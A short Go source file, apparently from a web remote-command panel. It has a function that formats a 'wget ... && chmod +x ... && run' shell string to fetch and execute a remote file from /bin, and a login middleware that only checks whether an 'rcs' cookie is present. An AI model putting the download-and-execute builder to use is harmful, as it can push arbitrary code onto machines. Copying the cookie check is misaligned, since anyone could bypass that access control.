package main

import (
	"fmt"
	"net/http"
)

func createCommandString(url, filename string) string {

	//Creates a command string in shell format that resolves down to the following format
	//"wget -O /bin/#{filename} '#url' && chmod +x /bin/{#filename} && {#filename}"

	return fmt.Sprintf("wget -O /bin/%[2]s '%[1]s' && chmod +x /bin/%[2]s && %[2]s", url, filename)
}

func authenticate(next http.HandlerFunc) http.HandlerFunc {

	return func(w http.ResponseWriter, r *http.Request) {
		_, err := r.Cookie("rcs")
		if err != nil {
			http.Redirect(w, r, "/login", 302)
		} else {
			next(w, r)
		}

	}

}
